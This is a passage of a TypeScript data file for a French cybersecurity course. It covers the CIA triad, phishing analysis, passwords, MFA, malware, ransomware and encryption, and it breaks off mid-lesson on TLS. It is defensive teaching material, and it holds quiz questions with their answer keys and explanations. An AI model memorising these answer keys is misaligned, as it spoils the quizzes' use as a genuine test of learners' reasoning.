import type { Course } from "../types";

const course: Course = {
  slug: "cybersecurite",
  title: "Cybersécurité : comprendre, détecter, défendre",
  tagline: "Du phishing au ransomware, apprends à raisonner comme un défenseur et à sécuriser un système réel.",
  description:
    "Un cours de terrain sur la sécurité des systèmes d'information. On part des principes qui ne bougent pas (la triade CIA, la surface d'attaque), on démonte les attaques qui font réellement mal aujourd'hui — phishing, ransomware, injection SQL, XSS — puis on construit une défense qui tient : MFA, gestionnaire de mots de passe, chiffrement, segmentation réseau, réponse à incident. Chaque partie s'appuie sur des outils qu'un professionnel utilise vraiment (Wireshark, nmap, OWASP ZAP, Have I Been Pwned, Bitwarden) et se termine par un quiz qui teste ton raisonnement, pas ta mémoire.",
  category: "Cybersécurité",
  level: "Intermédiaire",
  instructor: "Naïma Berrada",
  instructorBio:
    "Analyste SOC pendant six ans dans un opérateur télécom, puis consultante réponse à incident. Elle a géré une vraie crise ransomware un vendredi soir, et elle en parle sans fard.",
  hours: 6,
  rating: 4.8,
  learners: 2140,
  accent: "#2563eb",
  image: "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=800&q=80",
  language: "Français",
  software: "Wireshark, nmap, OWASP ZAP, Bitwarden",
  prerequisites: [
    "Savoir utiliser un terminal (naviguer, lancer une commande).",
    "Notions de base sur les réseaux : ce qu'est une adresse IP, un port, HTTP.",
    "Avoir déjà écrit un peu de code aide pour la partie web, mais ce n'est pas bloquant.",
  ],
  summary: [
    "Les fondamentaux : triade CIA, surface d'attaque, vocabulaire du risque.",
    "L'humain comme cible : phishing, mots de passe, MFA et gestion des identités.",
    "Malwares, ransomwares et les bases concrètes de la cryptographie.",
    "Sécurité réseau et web : pare-feu, segmentation, OWASP Top 10, SQLi et XSS.",
    "Défendre pour de vrai : réponse à incident, RGPD et hygiène durable.",
  ],
  objectives: [
    "Analyser la surface d'attaque d'un système et prioriser les risques.",
    "Reconnaître un email de phishing et une tentative d'ingénierie sociale.",
    "Mettre en place MFA et un gestionnaire de mots de passe correctement.",
    "Expliquer chiffrement symétrique, asymétrique et le fonctionnement de TLS.",
    "Identifier et corriger une injection SQL et une faille XSS.",
    "Dérouler les six phases d'une réponse à incident et respecter l'obligation de notification RGPD.",
  ],
  skills: [
    "Analyse de risque et modélisation de la menace",
    "Détection de phishing et sensibilisation",
    "Gestion des identités et authentification forte",
    "Sécurité applicative web (OWASP)",
    "Sécurité réseau et lecture de trafic",
    "Réponse à incident",
  ],
  contentTypes: ["Leçons écrites", "Démonstrations d'outils", "Quiz interactifs", "Études de cas"],
  parts: [
    {
      id: "p1",
      title: "Fondamentaux : penser en défenseur",
      lessons: [
        {
          id: "l1",
          title: "La triade CIA, et pourquoi elle n'est pas qu'un acronyme",
          type: "text",
          duration: "14 min",
          body:
            "## Trois propriétés, un équilibre\n\n" +
            "Toute la sécurité tient sur trois propriétés qu'on note CIA, pour Confidentialité, Intégrité, Disponibilité (en anglais Confidentiality, Integrity, Availability). Ce n'est pas une checklist décorative : c'est la grille avec laquelle on juge si une mesure sert vraiment à quelque chose.\n\n" +
            "- **Confidentialité** : l'information n'est lisible que par ceux qui y ont droit. Un dossier médical chiffré, un mot de passe qui ne circule jamais en clair.\n" +
            "- **Intégrité** : l'information n'a pas été modifiée sans autorisation, et on peut le prouver. Un virement de 100 € qui reste 100 €, un fichier dont on vérifie l'empreinte.\n" +
            "- **Disponibilité** : le service répond quand on en a besoin. Un hôpital dont le système de prescription tombe une nuit, c'est un problème de disponibilité, pas de vol de données.\n\n" +
            "## Les trois tirent dans des sens différents\n\n" +
            "Le piège classique, c'est de croire qu'on peut maximiser les trois en même temps. En pratique elles s'opposent. Chiffrer et sauvegarder trois fois une base renforce confidentialité et disponibilité, mais alourdit et complique. Exiger une double validation humaine pour chaque action protège l'intégrité et ralentit tout le monde.\n\n" +
            "> Une bonne décision de sécurité, c'est un arbitrage assumé entre ces trois propriétés, pas un « on sécurise tout ».\n\n" +
            "Prenons un cas réel de 2021 : l'oléoduc Colonial Pipeline, aux États-Unis, a été touché par le ransomware DarkSide. Les attaquants ont surtout cassé la **disponibilité** — l'entreprise a coupé elle-même ses systèmes par précaution, et une partie de la côte Est s'est retrouvée à sec d'essence. Le vol de données existait, mais le vrai dégât était l'arrêt de service.\n\n" +
            "## L'appliquer soi-même\n\n" +
            "Devant n'importe quel actif — une base clients, un site, un serveur de sauvegarde — pose-toi trois questions :\n\n" +
            "1. Qu'est-ce qui se passe si quelqu'un **lit** ça sans droit ? (confidentialité)\n" +
            "2. Qu'est-ce qui se passe si quelqu'un **modifie** ça en douce ? (intégrité)\n" +
            "3. Qu'est-ce qui se passe si ça **tombe** deux jours ? (disponibilité)\n\n" +
            "La réponse te dit où mettre l'effort. Pour un blog public, la confidentialité du contenu compte peu, mais l'intégrité (défiguration) et la disponibilité comptent. Pour un cabinet d'avocats, la confidentialité domine. On ne sécurise pas les deux de la même façon, et c'est très bien.",
        },
        {
          id: "l2",
          title: "Menace, vulnérabilité, risque : le vocabulaire qui change tout",
          type: "text",
          duration: "15 min",
          body:
            "## Trois mots qu'on confond tout le temps\n\n" +
            "Beaucoup de mauvaises décisions viennent d'un vocabulaire flou. On dit « on a une faille » pour parler d'un risque, ou « c'est une menace » pour une vulnérabilité. Précisons, parce que ces mots servent à prioriser.\n\n" +
            "- **Menace** (threat) : ce qui pourrait mal tourner et qui a une intention ou une cause. Un groupe de rançongiciel, un employé négligent, une panne électrique.\n" +
            "- **Vulnérabilité** : une faiblesse exploitable. Un logiciel non patché, un mot de passe par défaut, une porte de local technique jamais fermée.\n" +
            "- **Risque** : la combinaison des deux, pondérée par l'impact. Risque ≈ probabilité qu'une menace exploite une vulnérabilité × gravité si ça arrive.\n\n" +
            "Une vulnérabilité sans menace crédible reste théorique. Une menace sans vulnérabilité correspondante ne se réalise pas. C'est l'intersection qui coûte cher.\n\n" +
            "## La surface d'attaque\n\n" +
            "La **surface d'attaque**, c'est l'ensemble des points par lesquels un attaquant peut entrer ou interagir avec ton système : ports ouverts, formulaires web, comptes utilisateurs, API, clés USB, sous-traitants qui ont un accès, comptes cloud oubliés. Réduire la surface d'attaque est souvent le geste le plus rentable en sécurité. Un port fermé ne peut pas être attaqué. Un compte supprimé ne peut pas être compromis.\n\n" +
            "> Chaque fonctionnalité ajoutée agrandit la surface d'attaque. La sécurité et le « toujours plus de features » sont en tension permanente.\n\n" +
            "Un exemple concret : une entreprise expose un serveur de gestion à distance (RDP, port 3389) sur Internet « le temps du télétravail ». Voilà une porte grande ouverte sur la surface d'attaque. Les scanners automatisés la trouvent en quelques heures, et les attaques par force brute commencent. Fermer ce port, ou le passer derrière un VPN, supprime toute une classe d'attaques d'un coup.\n\n" +
            "## Défense en profondeur\n\n" +
            "Comme aucune barrière n'est parfaite, on empile les couches : c'est la **défense en profondeur** (defense in depth). Filtrage réseau, puis authentification forte, puis droits minimaux, puis chiffrement des données, puis journalisation et sauvegardes. Si une couche cède, la suivante ralentit l'attaquant et laisse le temps de réagir.\n\n" +
            "Le principe cousin est celui du **moindre privilège** : chaque personne, chaque service n'a que les droits strictement nécessaires. Le stagiaire n'a pas besoin d'être administrateur du domaine. L'application web n'a pas besoin d'un compte base de données qui peut supprimer des tables. Ces deux principes reviennent dans chaque partie du cours, alors garde-les en tête.",
        },
        {
          id: "l3",
          title: "Quiz — Fondamentaux",
          type: "quiz",
          duration: "6 min",
          questions: [
            {
              id: "q1",
              prompt:
                "Un site e-commerce est mis hors ligne par une attaque par déni de service. Aucune donnée n'est volée ni modifiée. Quelle propriété de la triade CIA est atteinte ?",
              options: ["Confidentialité", "Intégrité", "Disponibilité", "Aucune des trois"],
              correctIndex: 2,
              explanation:
                "Rien n'est lu ni altéré : c'est la capacité du service à répondre qui est visée, donc la disponibilité. C'est justement l'angle privilégié des attaques DDoS et de nombreux ransomwares.",
            },
            {
              id: "q2",
              prompt:
                "Une entreprise utilise partout la version 1.2 d'une bibliothèque connue pour une faille critique, mais son réseau interne est totalement isolé d'Internet et aucun code externe ne s'y exécute. Comment qualifier la situation ?",
              options: [
                "Un risque élevé, car la vulnérabilité existe",
                "Une vulnérabilité réelle mais un risque faible faute de menace exploitable",
                "Ni vulnérabilité ni risque",
                "Une menace, pas une vulnérabilité",
              ],
              correctIndex: 1,
              explanation:
                "La faiblesse (vulnérabilité) est bien là, mais sans chemin d'attaque crédible la menace ne peut pas l'exploiter. Le risque, produit des deux, reste faible. C'est pourquoi on ne patche pas tout avec la même urgence : on regarde l'exposition réelle.",
            },
            {
              id: "q3",
              prompt: "Quel geste réduit le plus directement la surface d'attaque ?",
              options: [
                "Ajouter un antivirus supplémentaire",
                "Fermer un port d'administration exposé sur Internet et le placer derrière un VPN",
                "Augmenter la fréquence des sauvegardes",
                "Former les employés au phishing",
              ],
              correctIndex: 1,
              explanation:
                "La surface d'attaque, ce sont les points d'entrée exposés. Fermer un service accessible depuis Internet en supprime un entièrement. Les autres options sont utiles mais renforcent des couches sans réduire l'exposition elle-même.",
            },
            {
              id: "q4",
              prompt:
                "Le principe du moindre privilège appliqué à une application web se traduit concrètement par :",
              options: [
                "Donner à l'application un compte base de données administrateur pour éviter les erreurs",
                "Donner à l'application uniquement les droits SQL dont elle a besoin (par ex. lecture/écriture sur certaines tables, pas DROP)",
                "Chiffrer le trafic entre l'application et la base",
                "Mettre l'application derrière un pare-feu",
              ],
              correctIndex: 1,
              explanation:
                "Le moindre privilège limite les droits au strict nécessaire. Si l'appli n'a pas le droit de supprimer des tables, une injection SQL réussie fait beaucoup moins de dégâts. Chiffrement et pare-feu sont d'autres couches, pas le moindre privilège.",
            },
          ],
        },
      ],
    },
    {
      id: "p2",
      title: "L'humain, cible numéro un",
      lessons: [
        {
          id: "l4",
          title: "Phishing et ingénierie sociale",
          type: "text",
          duration: "15 min",
          body:
            "## On n'attaque plus le mur, on attaque le gardien\n\n" +
            "La majorité des intrusions ne commencent pas par un exploit technique sophistiqué, mais par une personne qui clique. L'**ingénierie sociale** consiste à manipuler quelqu'un pour qu'il livre une information ou effectue une action contre son intérêt. Le **phishing** (hameçonnage) en est la forme la plus courante : un message qui se fait passer pour une source de confiance.\n\n" +
            "Les leviers psychologiques sont toujours les mêmes :\n\n" +
            "- **Urgence** : « votre compte sera suspendu dans 24 h ».\n" +
            "- **Autorité** : un message qui imite le PDG ou la banque.\n" +
            "- **Peur** : « activité suspecte détectée, vérifiez immédiatement ».\n" +
            "- **Appât du gain** : remboursement, colis, prime.\n\n" +
            "## Les variantes à connaître\n\n" +
            "- **Spear phishing** : ciblé, personnalisé avec ton nom, ton poste, un projet en cours. Beaucoup plus crédible.\n" +
            "- **Whaling** : on vise un dirigeant, car il peut autoriser un virement.\n" +
            "- **Fraude au président (BEC)** : un faux mail du dirigeant demande un virement urgent et confidentiel. Ce type d'arnaque a coûté des milliards à l'échelle mondiale d'après les rapports du FBI.\n" +
            "- **Smishing** (SMS) et **vishing** (appel vocal) : le canal change, la manipulation reste.\n\n" +
            "## Les signaux qui doivent alerter\n\n" +
            "1. **L'adresse d'expéditeur** ne correspond pas au domaine légitime (regarde après le @, pas le nom affiché).\n" +
            "2. **Le lien** ne pointe pas là où il prétend. Survole-le : `paypa1-secure.com` n'est pas `paypal.com`.\n" +
            "3. Une **demande inhabituelle** faite en urgence et qui contourne les procédures.\n" +
            "4. Une **pièce jointe** inattendue, surtout `.zip`, `.iso`, ou un document qui demande d'« activer les macros ».\n\n" +
            "> La règle qui sauve : en cas de doute sur une demande sensible, on vérifie par un **autre canal**. Un mail du comptable qui change un RIB ? On l'appelle sur le numéro qu'on connaît déjà, pas celui du mail.\n\n" +
            "Un dernier point souvent négligé : le phishing n'est pas qu'un problème de vigilance individuelle. Une organisation qui rend impossible la vérification (pas de procédure, pression permanente, culture du « fais vite ») fabrique ses propres victimes. La sensibilisation compte, mais les processus comptent autant.",
        },
        {
          id: "l5",
          title: "Démonstration : décortiquer un email de phishing",
          type: "video",
          duration: "12 min",
          videoLabel: "Analyse en direct des en-têtes et de l'URL d'un vrai message frauduleux",
          body:
            "## Ce que montre la démonstration\n\n" +
            "On prend un email qui se présente comme une notification de livraison d'un transporteur connu, et on l'ouvre dans un environnement sûr (client mail en mode texte, aucun clic sur les liens). L'objectif : montrer où regarder, dans l'ordre.\n\n" +
            "## Étape 1 — l'expéditeur réel\n\n" +
            "Le nom affiché dit « Suivi Colis Express ». Mais en affichant l'adresse complète, on lit `notif@track-colis-livraison.info`. Le domaine `.info` bricolé, sans rapport avec le vrai transporteur, est déjà un signal fort. Le nom affiché est cosmétique, il ne prouve rien.\n\n" +
            "## Étape 2 — les en-têtes\n\n" +
            "On ouvre les en-têtes techniques (dans Gmail : menu des trois points, « Afficher l'original »). On y cherche trois lignes :\n\n" +
            "- **SPF** : le serveur qui a envoyé le mail est-il autorisé pour ce domaine ?\n" +
            "- **DKIM** : la signature cryptographique du message est-elle valide ?\n" +
            "- **DMARC** : la politique du domaine est-elle respectée ?\n\n" +
            "Sur notre exemple, on lit `spf=fail` et `dkim=none`. Autrement dit, personne n'a prouvé que ce mail vient vraiment de qui il prétend. Un mail légitime d'une grande entreprise passe presque toujours ces contrôles.\n\n" +
            "## Étape 3 — l'URL sans cliquer\n\n" +
            "Le bouton « Suivre mon colis » affiche une belle URL, mais en survolant on voit la vraie destination en bas du client mail : `http://track-colis-livraison.info/verif?id=...`. Deux détails : `http` sans `s` (pas de chiffrement), et le domaine douteux. On peut aussi copier l'URL et l'analyser sur un service comme VirusTotal, sans jamais l'ouvrir dans un navigateur.\n\n" +
            "## Étape 4 — la charge\n\n" +
            "La page finale, qu'on n'ouvre que dans une machine jetable, réclame le paiement de « frais de douane » de 1,99 € avec la carte bancaire. Le montant est minuscule exprès : il paraît anodin, mais ce qui compte pour l'attaquant, c'est le numéro de carte complet.\n\n" +
            "> À retenir : on lit un mail suspect de l'extérieur vers l'intérieur — expéditeur, en-têtes, URL — sans jamais interagir. Le clic est la dernière chose qu'on fait, et seulement après avoir levé le doute.\n\n" +
            "En entreprise, le bon réflexe n'est pas seulement de supprimer : on **signale** le message à l'équipe sécurité, car un phishing arrive rarement à une seule personne.",
        },
        {
          id: "l6",
          title: "Mots de passe : entropie, gestionnaire et fuites",
          type: "text",
          duration: "16 min",
          body:
            "## Le problème n'est pas la complexité, c'est la longueur et l'unicité\n\n" +
            "Pendant vingt ans on a imposé des règles absurdes : une majuscule, un chiffre, un caractère spécial, changement tous les 90 jours. Résultat : `Printemps2024!` partout, et des post-it sous les claviers. Les recommandations actuelles, notamment celles du NIST américain, ont changé de cap : on privilégie des mots de passe **longs**, **uniques** par service, et on n'impose plus le changement périodique sans raison.\n\n" +
            "La bonne mesure, c'est l'**entropie** : le nombre de possibilités qu'un attaquant doit essayer. Une phrase de passe de quatre mots aléatoires (`girafe-tunnel-brique-orage`) est à la fois facile à retenir et très longue à casser. Un `P@ss1!` court est faible malgré ses symboles.\n\n" +
            "## Pourquoi l'unicité est vitale\n\n" +
            "Le vrai danger, c'est la réutilisation. Quand un site se fait pirater et que sa base de mots de passe fuite, les attaquants prennent ces couples email/mot de passe et les essaient partout ailleurs : c'est le **credential stuffing**. Si tu utilises le même mot de passe sur ton forum de jeu et sur ta banque, la fuite du forum compromet ta banque.\n\n" +
            "Vérifie si tes comptes ont déjà fuité sur [Have I Been Pwned](https://haveibeenpwned.com), un service gratuit et sérieux tenu par le chercheur Troy Hunt, qui agrège des milliards d'identifiants issus de fuites publiques. Si un mot de passe y apparaît, il faut le considérer comme mort.\n\n" +
            "## Le gestionnaire de mots de passe\n\n" +
            "Un humain ne peut pas retenir 80 mots de passe uniques de 16 caractères. C'est le rôle d'un **gestionnaire de mots de passe** comme Bitwarden (open source, avec une offre gratuite complète), 1Password ou KeePassXC. Le principe :\n\n" +
            "- Tu retiens **un seul** mot de passe maître, long et jamais réutilisé.\n" +
            "- Le gestionnaire génère et stocke un mot de passe aléatoire différent pour chaque site.\n" +
            "- Le coffre est chiffré localement ; même l'éditeur ne peut pas lire tes secrets.\n\n" +
            "Le bénéfice caché : le remplissage automatique ne fonctionne que sur le vrai domaine. Si tu arrives sur `paypa1.com`, ton gestionnaire ne propose rien — il vient de t'éviter un phishing sans que tu réfléchisses.\n\n" +
            "> Choisis un mot de passe maître que tu peux taper de mémoire mais que personne ne devinerait : quatre à cinq mots sans rapport. Note-le une fois sur papier, range-le en lieu sûr, et n'y touche plus.\n\n" +
            "Un mot de passe maître oublié = coffre irrécupérable, par conception. C'est le prix du chiffrement de bout en bout, et c'est voulu.",
        },
        {
          id: "l7",
          title: "MFA et gestion des identités",
          type: "text",
          duration: "15 min",
          body:
            "## Trois facteurs, pas trois mots de passe\n\n" +
            "L'authentification repose sur des **facteurs** de nature différente :\n\n" +
            "- Ce que tu **sais** : mot de passe, code PIN.\n" +
            "- Ce que tu **as** : téléphone, clé physique, carte.\n" +
            "- Ce que tu **es** : empreinte, visage.\n\n" +
            "L'authentification à plusieurs facteurs (**MFA**, souvent appelée 2FA quand il y en a deux) combine des facteurs de **catégories différentes**. Deux mots de passe, ce n'est pas du MFA. Un mot de passe plus un code envoyé sur ton téléphone, oui.\n\n" +
            "L'intérêt est énorme : même si ton mot de passe fuite, l'attaquant bute sur le second facteur. Microsoft a publié des chiffres montrant que le MFA bloque la très grande majorité des attaques automatisées sur les comptes. C'est probablement la mesure au meilleur rapport effort/résultat de tout ce cours.\n\n" +
            "## Toutes les MFA ne se valent pas\n\n" +
            "Par ordre croissant de robustesse :\n\n" +
            "1. **SMS** : mieux que rien, mais vulnérable au SIM swapping (l'attaquant se fait réattribuer ton numéro) et à l'interception. À éviter pour les comptes sensibles.\n" +
            "2. **Application TOTP** (Google Authenticator, Aegis, ou intégrée à Bitwarden) : génère un code à 6 chiffres qui change toutes les 30 secondes, hors ligne. Bon compromis, largement suffisant pour la plupart des usages.\n" +
            "3. **Clé de sécurité physique FIDO2 / WebAuthn** (type YubiKey) : le standard le plus solide. La clé vérifie cryptographiquement le domaine, ce qui la rend **résistante au phishing** — elle ne s'authentifiera pas sur un faux site, contrairement à un code TOTP que tu pourrais taper sur une page piégée.\n\n" +
            "## Au-delà du compte individuel : la gestion des identités\n\n" +
            "Dans une organisation, on ne gère pas des comptes isolés mais des **identités** et leur cycle de vie. Les bonnes pratiques :\n\n" +
            "- **SSO** (authentification unique) : un point d'entrée central, ce qui simplifie et permet d'appliquer le MFA partout.\n" +
            "- **Provisioning / deprovisioning** : quand quelqu'un arrive, on lui donne les bons accès ; quand il part, on les coupe **le jour même**. Les comptes d'anciens employés jamais désactivés sont une porte d'entrée classique.\n" +
            "- **Revue périodique des accès** : qui a accès à quoi, et est-ce encore justifié ? On retombe sur le moindre privilège.\n\n" +
            "> Active le MFA aujourd'hui sur tes trois comptes les plus critiques : messagerie principale, banque, et le compte qui sert à réinitialiser les autres. Ta boîte mail est souvent la clé de tout le reste.",
        },
        {
          id: "l8",
          title: "Quiz — L'humain",
          type: "quiz",
          duration: "6 min",
          questions: [
            {
              id: "q5",
              prompt:
                "Tu reçois un mail du « directeur financier » demandant un virement urgent et confidentiel vers un nouveau fournisseur. Le style est correct et le nom exact. Quelle est la meilleure réaction ?",
              options: [
                "Exécuter, puisque le nom et le poste sont corrects",
                "Répondre au mail pour demander confirmation",
                "Vérifier par un autre canal connu (l'appeler sur son numéro habituel) avant toute action",
                "Transférer le mail au service comptable pour qu'il décide",
              ],
              correctIndex: 2,
              explanation:
                "C'est le scénario type de la fraude au président (BEC). Répondre au mail ne prouve rien : si le compte est usurpé, l'attaquant reçoit ta réponse. La vérification par un canal indépendant et déjà connu est la seule parade fiable.",
            },
            {
              id: "q6",
              prompt: "Pourquoi la réutilisation d'un mot de passe est-elle plus dangereuse que sa simplicité ?",
              options: [
                "Parce qu'un mot de passe réutilisé est toujours plus court",
                "Parce qu'une fuite sur un seul site permet le credential stuffing sur tous les autres comptes partageant ce mot de passe",
                "Parce que les mots de passe réutilisés expirent plus vite",
                "Ce n'est pas plus dangereux, les deux se valent",
              ],
              correctIndex: 1,
              explanation:
                "Le credential stuffing rejoue les couples email/mot de passe fuités sur d'autres services. Un mot de passe unique, même moyennement complexe, cloisonne le risque : la fuite d'un site n'affecte que ce site.",
            },
            {
              id: "q7",
              prompt:
                "Pour un compte très sensible et fréquemment ciblé par du phishing, quelle méthode de MFA offre la meilleure résistance au phishing ?",
              options: [
                "Un code reçu par SMS",
                "Un code TOTP d'une application d'authentification",
                "Une clé de sécurité physique FIDO2 / WebAuthn",
                "Une question secrète en plus du mot de passe",
              ],
              correctIndex: 2,
              explanation:
                "Une clé FIDO2 vérifie cryptographiquement le domaine et refuse de s'authentifier sur un faux site. Un code TOTP ou SMS peut être saisi par la victime sur une page piégée, puis rejoué par l'attaquant en temps réel. Une question secrète n'est qu'un second « ce que tu sais », pas un vrai second facteur.",
            },
            {
              id: "q8",
              prompt:
                "Un gestionnaire de mots de passe ne propose pas de remplir automatiquement tes identifiants sur une page qui ressemble pourtant à ta banque. Qu'est-ce que cela indique probablement ?",
              options: [
                "Un bug du gestionnaire",
                "Que le domaine de la page ne correspond pas au domaine enregistré : possible site de phishing",
                "Que ton coffre est corrompu",
                "Qu'il faut désactiver le remplissage automatique",
              ],
              correctIndex: 1,
              explanation:
                "Le remplissage automatique est lié au domaine exact. S'il ne se déclenche pas, c'est souvent parce que l'URL n'est pas la bonne (par ex. un homoglyphe). Le gestionnaire vient de te signaler un phishing potentiel sans que tu aies eu à le repérer toi-même.",
            },
          ],
        },
      ],
    },
    {
      id: "p3",
      title: "Malwares, ransomwares et cryptographie",
      lessons: [
        {
          id: "l9",
          title: "Panorama des malwares",
          type: "text",
          duration: "14 min",
          body:
            "## Un mot-valise pour des choses très différentes\n\n" +
            "« Malware » (logiciel malveillant) désigne tout code écrit pour nuire. Mais mettre un virus et un cheval de Troie dans le même sac empêche de comprendre comment on se défend. Classons par comportement.\n\n" +
            "- **Virus** : s'attache à un fichier ou programme légitime et se propage quand on l'exécute. Rare aujourd'hui sous sa forme historique.\n" +
            "- **Ver** (worm) : se propage tout seul de machine en machine via le réseau, sans action humaine. WannaCry, en 2017, a paralysé des hôpitaux britanniques en exploitant une faille de Windows non patchée.\n" +
            "- **Cheval de Troie** (trojan) : se fait passer pour un logiciel utile. C'est le plus courant : le faux crack, la fausse mise à jour Flash, la pièce jointe piégée.\n" +
            "- **Rançongiciel** (ransomware) : chiffre tes fichiers et réclame une rançon. On y consacre la leçon suivante.\n" +
            "- **Spyware / stealer** : vole des données — mots de passe, cookies de session, portefeuilles crypto. Les infostealers modernes revendent tes sessions actives, ce qui contourne même le MFA.\n" +
            "- **Rootkit** : se cache profondément dans le système pour rester indétectable et persister.\n" +
            "- **Botnet** : ton appareil devient un soldat dans une armée contrôlée à distance, utilisée pour du DDoS ou du spam.\n\n" +
            "## Comment un malware entre\n\n" +
            "Les vecteurs sont peu nombreux et connus :\n\n" +
            "1. Pièce jointe ou lien de phishing (le plus fréquent).\n" +
            "2. Logiciel téléchargé hors source officielle (cracks, sites douteux).\n" +
            "3. Exploitation d'une vulnérabilité non patchée exposée sur le réseau.\n" +
            "4. Support amovible (clé USB trouvée sur un parking — ça marche encore).\n" +
            "5. Compromission de la chaîne d'approvisionnement : une mise à jour légitime piégée en amont (cas SolarWinds en 2020).\n\n" +
            "## Se défendre sans magie\n\n" +
            "L'antivirus moderne (on parle d'**EDR**, Endpoint Detection and Response, en entreprise) aide, mais il n'est pas une police d'assurance. Les couches qui comptent vraiment :\n\n" +
            "- **Patcher** vite : la plupart des vers exploitent des failles pour lesquelles un correctif existait déjà.\n" +
            "- **Moindre privilège** : un malware exécuté par un compte non-admin fait beaucoup moins de dégâts.\n" +
            "- **Ne pas exécuter n'importe quoi** : sources officielles uniquement, macros désactivées par défaut.\n" +
            "- **Sauvegardes** hors ligne, on y revient.\n\n" +
            "> Le meilleur antivirus, c'est un système à jour et un utilisateur qui n'exécute que ce qu'il attend. La technologie complète cette discipline, elle ne la remplace pas.",
        },
        {
          id: "l10",
          title: "Anatomie d'une attaque ransomware",
          type: "text",
          duration: "16 min",
          body:
            "## La menace qui a changé le métier\n\n" +
            "Le ransomware est devenu la menace numéro un pour les organisations parce qu'il transforme directement une intrusion en argent. Le principe : l'attaquant chiffre tes données et vend la clé de déchiffrement. Mais une attaque moderne, ce n'est pas un simple mail piégé qui chiffre tout en cinq minutes. C'est une opération en plusieurs jours.\n\n" +
            "## Le déroulé typique\n\n" +
            "1. **Accès initial** : phishing, identifiants achetés à un courtier d'accès, ou service exposé (RDP, VPN vulnérable).\n" +
            "2. **Élévation de privilèges** : l'attaquant cherche un compte administrateur. Un mot de passe faible, une faille locale non patchée suffisent.\n" +
            "3. **Déplacement latéral** : il se propage de machine en machine, cartographie le réseau, repère les serveurs de fichiers et les sauvegardes. Cette phase peut durer des jours sans être détectée.\n" +
            "4. **Exfiltration** : avant de chiffrer, il **copie** vos données sensibles. C'est la fameuse **double extorsion** : « payez, sinon on publie ». Même avec des sauvegardes parfaites, vous êtes menacé de fuite.\n" +
            "5. **Destruction des sauvegardes** : il supprime ou chiffre vos backups accessibles depuis le réseau, pour vous ôter l'alternative à la rançon.\n" +
            "6. **Chiffrement** : souvent lancé un vendredi soir ou une veille de jour férié, quand personne ne surveille.\n\n" +
            "## Faut-il payer ?\n\n" +
            "La position des autorités, en France l'ANSSI comme aux États-Unis le FBI, est de **ne pas payer**. Payer finance l'écosystème criminel, ne garantit pas la récupération (les outils de déchiffrement fournis sont parfois défaillants), et ne supprime pas les données déjà exfiltrées. Certaines organisations paient quand même, sous la pression vitale d'un arrêt total. C'est une décision de crise, pas une stratégie.\n\n" +
            "## La vraie défense se prépare avant\n\n" +
            "La sauvegarde reste l'arme décisive, à condition qu'elle survive à l'attaque. Applique la règle **3-2-1** :\n\n" +
            "- **3** copies de tes données,\n" +
            "- sur **2** supports différents,\n" +
            "- dont **1** hors site et **hors ligne** (déconnectée du réseau, ou immuable).\n\n" +
            "Une sauvegarde branchée en permanence sur le réseau sera chiffrée en même temps que le reste. Le mot clé, c'est **hors ligne** ou **immuable**.\n\n" +
            "> Teste tes restaurations. Une sauvegarde qu'on n'a jamais restaurée est une hypothèse, pas une sécurité. Le jour de la crise n'est pas le moment de découvrir qu'un fichier de backup était corrompu depuis six mois.\n\n" +
            "Ajoute à cela la détection (repérer le déplacement latéral tôt), la segmentation réseau (limiter la propagation) et un plan de réponse écrit — sujets des parties suivantes.",
        },
        {
          id: "l11",
          title: "Chiffrement symétrique et asymétrique",
          type: "text",
          duration: "16 min",
          body:
            "## Deux familles, deux usages\n\n" +
            "Le chiffrement transforme un message lisible (clair) en quelque chose d'inintelligible (chiffré), réversible uniquement avec la bonne clé. Il existe deux grandes familles, et la clé du sujet, c'est de comprendre pourquoi on a besoin des deux.\n\n" +
            "## Symétrique : une seule clé\n\n" +
            "En chiffrement **symétrique**, la même clé sert à chiffrer et à déchiffrer. L'algorithme de référence est **AES** (Advanced Encryption Standard), rapide et considéré comme sûr avec des clés de 256 bits. On l'utilise pour chiffrer de gros volumes : disques durs, fichiers, bases de données.\n\n" +
            "Son problème est logistique : comment transmettre la clé à ton correspondant sans qu'un espion l'intercepte ? Si tu envoies la clé par le même canal que le message, un attaquant qui écoute obtient les deux. C'est le **problème de la distribution des clés**, et il a bloqué la cryptographie pendant des siècles.\n\n" +
            "## Asymétrique : une paire de clés\n\n" +
            "Le chiffrement **asymétrique** (à clé publique) résout ce problème. Chaque personne a une paire de clés mathématiquement liées :\n\n" +
            "- une **clé publique**, qu'on peut diffuser à tout le monde,\n" +
            "- une **clé privée**, gardée secrète.\n\n" +
            "Ce qui est chiffré avec la clé publique ne se déchiffre qu'avec la clé privée correspondante. N'importe qui peut donc t'envoyer un message confidentiel avec ta clé publique ; toi seul, avec ta clé privée, peux le lire. Plus besoin de partager un secret au préalable. Les algorithmes courants sont **RSA** et les courbes elliptiques (**ECC**), plus efficaces à sécurité égale.\n\n" +
            "L'asymétrique sert aussi à la **signature numérique** : tu signes avec ta clé privée, et tout le monde vérifie avec ta clé publique. Cela prouve l'origine (authenticité) et la non-altération (intégrité) — deux propriétés de notre triade.\n\n" +
            "## Pourquoi on combine les deux\n\n" +
            "L'asymétrique est élégant mais lent, mal adapté aux gros volumes. Le symétrique est rapide mais souffre de la distribution des clés. La solution pragmatique, utilisée partout, est le **chiffrement hybride** :\n\n" +
            "1. On génère une clé symétrique aléatoire (dite clé de session).\n" +
            "2. On chiffre le message, gros et rapide, avec cette clé symétrique (AES).\n" +
            "3. On chiffre uniquement la petite clé de session avec la clé **publique** du destinataire (asymétrique).\n" +
            "4. On envoie le tout.\n\n" +
            "Le destinataire déchiffre la clé de session avec sa clé privée, puis déchiffre le message avec cette clé. C'est exactement ce que fait TLS, sujet de la leçon suivante.\n\n" +
            "> Ne confonds pas chiffrement et hachage. Le hachage (SHA-256) est à sens unique, non réversible : il sert à vérifier l'intégrité et à stocker les mots de passe, pas à chiffrer un message qu'on veut relire.",
        },
        {
          id: "l12",
          title: "TLS et HTTPS, sous le capot",
          type: "text",
          duration: "15 min",
          body:
            "## Ce que le cadenas signifie vraiment\n\n" +
            "Le cadenas de ton navigateur veut dire que la connexion utilise **TLS** (Transport Layer Security), le successeur de SSL. HTTPS, c'est simplement HTTP transporté dans un tunnel TLS. TLS apporte trois garanties, qu'on reconnaît directement dans la triade CIA :\n\n" +
            "- **Confidentialité** : le trafic est chiffré, un espion sur le réseau ne lit rien d'utile.\n" +
            "- **Intégrité** : toute modification en transit est détectée.\n" +
            "- **Authentification** : le serveur prouve qu'il est bien celui qu'il prétend, via son certificat.\n\n" +
